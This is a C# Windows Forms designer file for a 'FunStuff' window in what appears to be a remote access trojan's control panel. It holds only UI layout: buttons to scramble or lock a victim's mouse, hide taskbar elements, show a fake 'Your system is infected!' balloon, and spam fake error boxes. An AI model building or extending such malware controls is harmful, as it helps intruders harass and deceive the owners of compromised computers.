namespace RAT.ControlPanel.Forms
{
    partial class frmFunStuff
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.btnMouseTrails = new System.Windows.Forms.Button();
            this.btnUnlockMouse = new System.Windows.Forms.Button();
            this.btnLockMouse = new System.Windows.Forms.Button();
            this.btnCrazyMouse = new System.Windows.Forms.Button();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.btnKeyboardSmile = new System.Windows.Forms.Button();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.btnToggleClock = new System.Windows.Forms.Button();
            this.btnToggleTray = new System.Windows.Forms.Button();
            this.btnToggleStart = new System.Windows.Forms.Button();
            this.btnToggleTaskbar = new System.Windows.Forms.Button();
            this.btnToggleDesktop = new System.Windows.Forms.Button();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.btnBalloonTip = new System.Windows.Forms.Button();
            this.comboBalloonIcon = new System.Windows.Forms.ComboBox();
            this.label3 = new System.Windows.Forms.Label();
            this.numBalloonDuration = new System.Windows.Forms.NumericUpDown();
            this.label2 = new System.Windows.Forms.Label();
            this.txtBalloonText = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.txtBalloonTitle = new System.Windows.Forms.TextBox();
            this.lblBalloonTitle = new System.Windows.Forms.Label();
            this.groupBox5 = new System.Windows.Forms.GroupBox();
            this.btnMessageBoxSpam = new System.Windows.Forms.Button();
            this.numMsgBoxCount = new System.Windows.Forms.NumericUpDown();
            this.label4 = new System.Windows.Forms.Label();
            this.txtMsgBoxText = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.txtMsgBoxTitle = new System.Windows.Forms.TextBox();
            this.label6 = new System.Windows.Forms.Label();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.lblStatus = new System.Windows.Forms.ToolStripStatusLabel();
            
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numBalloonDuration)).BeginInit();
            this.groupBox5.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numMsgBoxCount)).BeginInit();
            this.statusStrip1.SuspendLayout();
            this.SuspendLayout();
            
            // groupBox1
            this.groupBox1.Controls.Add(this.btnMouseTrails);
            this.groupBox1.Controls.Add(this.btnUnlockMouse);
            this.groupBox1.Controls.Add(this.btnLockMouse);
            this.groupBox1.Controls.Add(this.btnCrazyMouse);
            this.groupBox1.Location = new System.Drawing.Point(12, 12);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(360, 120);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Mouse Fun";
            
            // btnCrazyMouse
            this.btnCrazyMouse.Location = new System.Drawing.Point(15, 30);
            this.btnCrazyMouse.Name = "btnCrazyMouse";
            this.btnCrazyMouse.Size = new System.Drawing.Size(160, 35);
            this.btnCrazyMouse.TabIndex = 0;
            this.btnCrazyMouse.Text = "Crazy Mouse";
            this.btnCrazyMouse.UseVisualStyleBackColor = true;
            this.btnCrazyMouse.Click += new System.EventHandler(this.btnCrazyMouse_Click);
            
            // btnLockMouse
            this.btnLockMouse.Location = new System.Drawing.Point(185, 30);
            this.btnLockMouse.Name = "btnLockMouse";
            this.btnLockMouse.Size = new System.Drawing.Size(160, 35);
            this.btnLockMouse.TabIndex = 1;
            this.btnLockMouse.Text = "Lock Mouse";
            this.btnLockMouse.UseVisualStyleBackColor = true;
            this.btnLockMouse.Click += new System.EventHandler(this.btnLockMouse_Click);
            
            // btnUnlockMouse
            this.btnUnlockMouse.Location = new System.Drawing.Point(15, 75);
            this.btnUnlockMouse.Name = "btnUnlockMouse";
            this.btnUnlockMouse.Size = new System.Drawing.Size(160, 35);
            this.btnUnlockMouse.TabIndex = 2;
            this.btnUnlockMouse.Text = "Unlock Mouse";
            this.btnUnlockMouse.UseVisualStyleBackColor = true;
            this.btnUnlockMouse.Click += new System.EventHandler(this.btnUnlockMouse_Click);
            
            // btnMouseTrails
            this.btnMouseTrails.Location = new System.Drawing.Point(185, 75);
            this.btnMouseTrails.Name = "btnMouseTrails";
            this.btnMouseTrails.Size = new System.Drawing.Size(160, 35);
            this.btnMouseTrails.TabIndex = 3;
            this.btnMouseTrails.Text = "Mouse Trails";
            this.btnMouseTrails.UseVisualStyleBackColor = true;
            this.btnMouseTrails.Click += new System.EventHandler(this.btnMouseTrails_Click);
            
            // groupBox2
            this.groupBox2.Controls.Add(this.btnKeyboardSmile);
            this.groupBox2.Location = new System.Drawing.Point(12, 138);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(360, 80);
            this.groupBox2.TabIndex = 1;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Keyboard Fun";
            
            // btnKeyboardSmile
            this.btnKeyboardSmile.Location = new System.Drawing.Point(15, 30);
            this.btnKeyboardSmile.Name = "btnKeyboardSmile";
            this.btnKeyboardSmile.Size = new System.Drawing.Size(330, 35);
            this.btnKeyboardSmile.TabIndex = 0;
            this.btnKeyboardSmile.Text = "Keyboard Smile";
            this.btnKeyboardSmile.UseVisualStyleBackColor = true;
            this.btnKeyboardSmile.Click += new System.EventHandler(this.btnKeyboardSmile_Click);
            
            // groupBox3
            this.groupBox3.Controls.Add(this.btnToggleClock);
            this.groupBox3.Controls.Add(this.btnToggleTray);
            this.groupBox3.Controls.Add(this.btnToggleStart);
            this.groupBox3.Controls.Add(this.btnToggleTaskbar);
            this.groupBox3.Controls.Add(this.btnToggleDesktop);
            this.groupBox3.Location = new System.Drawing.Point(12, 224);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(360, 165);
            this.groupBox3.TabIndex = 2;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "UI Fun";
            
            // btnToggleDesktop
            this.btnToggleDesktop.Location = new System.Drawing.Point(15, 30);
            this.btnToggleDesktop.Name = "btnToggleDesktop";
            this.btnToggleDesktop.Size = new System.Drawing.Size(160, 35);
            this.btnToggleDesktop.TabIndex = 0;
            this.btnToggleDesktop.Text = "Toggle Desktop Icons";
            this.btnToggleDesktop.UseVisualStyleBackColor = true;
            this.btnToggleDesktop.Click += new System.EventHandler(this.btnToggleDesktop_Click);
            
            // btnToggleTaskbar
            this.btnToggleTaskbar.Location = new System.Drawing.Point(185, 30);
            this.btnToggleTaskbar.Name = "btnToggleTaskbar";
            this.btnToggleTaskbar.Size = new System.Drawing.Size(160, 35);
            this.btnToggleTaskbar.TabIndex = 1;
            this.btnToggleTaskbar.Text = "Toggle Taskbar";
            this.btnToggleTaskbar.UseVisualStyleBackColor = true;
            this.btnToggleTaskbar.Click += new System.EventHandler(this.btnToggleTaskbar_Click);
            
            // btnToggleStart
            this.btnToggleStart.Location = new System.Drawing.Point(15, 75);
            this.btnToggleStart.Name = "btnToggleStart";
            this.btnToggleStart.Size = new System.Drawing.Size(160, 35);
            this.btnToggleStart.TabIndex = 2;
            this.btnToggleStart.Text = "Toggle Start Button";
            this.btnToggleStart.UseVisualStyleBackColor = true;
            this.btnToggleStart.Click += new System.EventHandler(this.btnToggleStart_Click);
            
            // btnToggleTray
            this.btnToggleTray.Location = new System.Drawing.Point(185, 75);
            this.btnToggleTray.Name = "btnToggleTray";
            this.btnToggleTray.Size = new System.Drawing.Size(160, 35);
            this.btnToggleTray.TabIndex = 3;
            this.btnToggleTray.Text = "Toggle System Tray";
            this.btnToggleTray.UseVisualStyleBackColor = true;
            this.btnToggleTray.Click += new System.EventHandler(this.btnToggleTray_Click);
            
            // btnToggleClock
            this.btnToggleClock.Location = new System.Drawing.Point(15, 120);
            this.btnToggleClock.Name = "btnToggleClock";
            this.btnToggleClock.Size = new System.Drawing.Size(160, 35);
            this.btnToggleClock.TabIndex = 4;
            this.btnToggleClock.Text = "Toggle Clock";
            this.btnToggleClock.UseVisualStyleBackColor = true;
            this.btnToggleClock.Click += new System.EventHandler(this.btnToggleClock_Click);
            
            // groupBox4
            this.groupBox4.Controls.Add(this.btnBalloonTip);
            this.groupBox4.Controls.Add(this.comboBalloonIcon);
            this.groupBox4.Controls.Add(this.label3);
            this.groupBox4.Controls.Add(this.numBalloonDuration);
            this.groupBox4.Controls.Add(this.label2);
            this.groupBox4.Controls.Add(this.txtBalloonText);
            this.groupBox4.Controls.Add(this.label1);
            this.groupBox4.Controls.Add(this.txtBalloonTitle);
            this.groupBox4.Controls.Add(this.lblBalloonTitle);
            this.groupBox4.Location = new System.Drawing.Point(390, 12);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(360, 220);
            this.groupBox4.TabIndex = 3;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Balloon Tip";
            
            // lblBalloonTitle
            this.lblBalloonTitle.AutoSize = true;
            this.lblBalloonTitle.Location = new System.Drawing.Point(15, 30);
            this.lblBalloonTitle.Name = "lblBalloonTitle";
            this.lblBalloonTitle.Size = new System.Drawing.Size(33, 15);
            this.lblBalloonTitle.TabIndex = 0;
            this.lblBalloonTitle.Text = "Title:";
            
            // txtBalloonTitle
            this.txtBalloonTitle.Location = new System.Drawing.Point(80, 27);
            this.txtBalloonTitle.Name = "txtBalloonTitle";
            this.txtBalloonTitle.Size = new System.Drawing.Size(265, 23);
            this.txtBalloonTitle.TabIndex = 1;
            this.txtBalloonTitle.Text = "Warning!";
            
            // label1
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(15, 65);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(31, 15);
            this.label1.TabIndex = 2;
            this.label1.Text = "Text:";
            
            // txtBalloonText
            this.txtBalloonText.Location = new System.Drawing.Point(80, 62);
            this.txtBalloonText.Multiline = true;
            this.txtBalloonText.Name = "txtBalloonText";
            this.txtBalloonText.Size = new System.Drawing.Size(265, 60);
            this.txtBalloonText.TabIndex = 3;
            this.txtBalloonText.Text = "Your system is infected!";
            
            // label2
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(15, 135);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(58, 15);
            this.label2.TabIndex = 4;
            this.label2.Text = "Duration:";
            
            // numBalloonDuration
            this.numBalloonDuration.Location = new System.Drawing.Point(80, 133);
            this.numBalloonDuration.Maximum = new decimal(new int[] { 60, 0, 0, 0 });
            this.numBalloonDuration.Minimum = new decimal(new int[] { 1, 0, 0, 0 });
            this.numBalloonDuration.Name = "numBalloonDuration";
            this.numBalloonDuration.Size = new System.Drawing.Size(100, 23);
            this.numBalloonDuration.TabIndex = 5;
            this.numBalloonDuration.Value = new decimal(new int[] { 5, 0, 0, 0 });
            
            // label3
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(15, 170);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(34, 15);
            this.label3.TabIndex = 6;
            this.label3.Text = "Icon:";
            
            // comboBalloonIcon
            this.comboBalloonIcon.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBalloonIcon.FormattingEnabled = true;
            this.comboBalloonIcon.Items.AddRange(new object[] { "None", "Info", "Warning", "Error" });
            this.comboBalloonIcon.Location = new System.Drawing.Point(80, 167);
            this.comboBalloonIcon.Name = "comboBalloonIcon";
            this.comboBalloonIcon.Size = new System.Drawing.Size(150, 23);
            this.comboBalloonIcon.TabIndex = 7;
            this.comboBalloonIcon.SelectedIndex = 2;
            
            // btnBalloonTip
            this.btnBalloonTip.Location = new System.Drawing.Point(245, 165);
            this.btnBalloonTip.Name = "btnBalloonTip";
            this.btnBalloonTip.Size = new System.Drawing.Size(100, 35);
            this.btnBalloonTip.TabIndex = 8;
            this.btnBalloonTip.Text = "Send";
            this.btnBalloonTip.UseVisualStyleBackColor = true;
            this.btnBalloonTip.Click += new System.EventHandler(this.btnBalloonTip_Click);
            
            // groupBox5
            this.groupBox5.Controls.Add(this.btnMessageBoxSpam);
            this.groupBox5.Controls.Add(this.numMsgBoxCount);
            this.groupBox5.Controls.Add(this.label4);
            this.groupBox5.Controls.Add(this.txtMsgBoxText);
            this.groupBox5.Controls.Add(this.label5);
            this.groupBox5.Controls.Add(this.txtMsgBoxTitle);
            this.groupBox5.Controls.Add(this.label6);
            this.groupBox5.Location = new System.Drawing.Point(390, 238);
            this.groupBox5.Name = "groupBox5";
            this.groupBox5.Size = new System.Drawing.Size(360, 151);
            this.groupBox5.TabIndex = 4;
            this.groupBox5.TabStop = false;
            this.groupBox5.Text = "MessageBox Spam";
            
            // label6
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(15, 30);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(33, 15);
            this.label6.TabIndex = 0;
            this.label6.Text = "Title:";
            
            // txtMsgBoxTitle
            this.txtMsgBoxTitle.Location = new System.Drawing.Point(80, 27);
            this.txtMsgBoxTitle.Name = "txtMsgBoxTitle";
            this.txtMsgBoxTitle.Size = new System.Drawing.Size(265, 23);
            this.txtMsgBoxTitle.TabIndex = 1;
            this.txtMsgBoxTitle.Text = "Error";
            
            // label5
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(15, 65);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(31, 15);
            this.label5.TabIndex = 2;
            this.label5.Text = "Text:";
            
            // txtMsgBoxText
            this.txtMsgBoxText.Location = new System.Drawing.Point(80, 62);
            this.txtMsgBoxText.Name = "txtMsgBoxText";
            this.txtMsgBoxText.Size = new System.Drawing.Size(265, 23);
            this.txtMsgBoxText.TabIndex = 3;
            this.txtMsgBoxText.Text = "System error occurred!";
            
            // label4
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(15, 100);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(43, 15);
            this.label4.TabIndex = 4;
            this.label4.Text = "Count:";
            
            // numMsgBoxCount
            this.numMsgBoxCount.Location = new System.Drawing.Point(80, 98);
            this.numMsgBoxCount.Maximum = new decimal(new int[] { 100, 0, 0, 0 });
            this.numMsgBoxCount.Minimum = new decimal(new int[] { 1, 0, 0, 0 });
            this.numMsgBoxCount.Name = "numMsgBoxCount";
            this.numMsgBoxCount.Size = new System.Drawing.Size(100, 23);
            this.numMsgBoxCount.TabIndex = 5;
            this.numMsgBoxCount.Value = new decimal(new int[] { 10, 0, 0, 0 });
            
            // btnMessageBoxSpam
            this.btnMessageBoxSpam.Location = new System.Drawing.Point(245, 95);
            this.btnMessageBoxSpam.Name = "btnMessageBoxSpam";
            this.btnMessageBoxSpam.Size = new System.Drawing.Size(100, 35);
            this.btnMessageBoxSpam.TabIndex = 6;
            this.btnMessageBoxSpam.Text = "Send";
            this.btnMessageBoxSpam.UseVisualStyleBackColor = true;
            this.btnMessageBoxSpam.Click += new System.EventHandler(this.btnMessageBoxSpam_Click);
            
            // statusStrip1
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
                this.lblStatus});
            this.statusStrip1.Location = new System.Drawing.Point(0, 408);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(764, 22);
            this.statusStrip1.TabIndex = 5;
            
            // lblStatus
            this.lblStatus.Name = "lblStatus";
            this.lblStatus.Size = new System.Drawing.Size(39, 17);
            this.lblStatus.Text = "Ready";
            
            // frmFunStuff
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(764, 430);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.groupBox5);
            this.Controls.Add(this.groupBox4);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.Name = "frmFunStuff";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "FunStuff";
            
            this.groupBox1.ResumeLayout(false);
            this.groupBox2.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numBalloonDuration)).EndInit();
            this.groupBox5.ResumeLayout(false);
            this.groupBox5.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numMsgBoxCount)).EndInit();
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Button btnMouseTrails;
        private System.Windows.Forms.Button btnUnlockMouse;
        private System.Windows.Forms.Button btnLockMouse;
        private System.Windows.Forms.Button btnCrazyMouse;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Button btnKeyboardSmile;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Button btnToggleClock;
        private System.Windows.Forms.Button btnToggleTray;
        private System.Windows.Forms.Button btnToggleStart;
        private System.Windows.Forms.Button btnToggleTaskbar;
        private System.Windows.Forms.Button btnToggleDesktop;
        private System.Windows.Forms.GroupBox groupBox4;
        private System.Windows.Forms.Button btnBalloonTip;
        private System.Windows.Forms.ComboBox comboBalloonIcon;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.NumericUpDown numBalloonDuration;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox txtBalloonText;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox txtBalloonTitle;
        private System.Windows.Forms.Label lblBalloonTitle;
        private System.Windows.Forms.GroupBox groupBox5;
        private System.Windows.Forms.Button btnMessageBoxSpam;
        private System.Windows.Forms.NumericUpDown numMsgBoxCount;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox txtMsgBoxText;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.TextBox txtMsgBoxTitle;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.StatusStrip statusStrip1;
        private System.Windows.Forms.ToolStripStatusLabel lblStatus;
    }
}
